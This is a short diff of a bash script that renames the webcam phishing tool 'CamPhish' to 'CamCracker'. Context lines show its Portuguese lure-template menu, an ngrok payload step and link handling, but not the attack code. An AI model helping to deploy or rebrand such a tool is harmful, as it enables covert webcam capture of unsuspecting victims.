@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.0
+# CamCracker v1.0
 # Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
@@ -138,7 +138,7 @@ printf "\e[1;93m [!] Opção de túnel inválida! tente novamente\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+CamCracker
 else
 printf "\n----- Escolha um modelo ---- \n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Desejo do Festival\e[0m\n"
@@ -209,7 +209,7 @@ payload_ngrok
 checkfound
 }
 
-camphish() {
+CamCracker() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -232,7 +232,7 @@ else
 printf "\e[1;93m [!] Opção inválida! \e[0m\n"
 sleep 1
 clear
-camphish
+CamCracker
 fi
 
 }
@@ -276,5 +276,5 @@ checkfound
 
 banner
 dependencies
-camphish
+CamCracker
 
